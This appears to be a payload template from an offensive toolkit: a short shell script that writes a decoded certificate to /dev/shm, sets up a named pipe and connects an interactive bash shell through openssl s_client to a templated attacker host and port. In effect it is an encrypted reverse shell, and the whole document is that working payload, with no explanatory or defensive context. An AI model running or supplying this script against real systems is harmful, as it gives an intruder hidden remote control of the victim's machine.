echo SHELL_CRT_ENCODED | base64 -d > /dev/shm/c
rm -f /dev/shm/s
mkfifo /dev/shm/s && bash -i < /dev/shm/s 2>&1 | openssl s_client -quiet -CAfile /dev/shm/c -verify_return_error -connect {{ LHOST }}:{{ LPORT }} > /dev/shm/s
rm -f /dev/shm/s
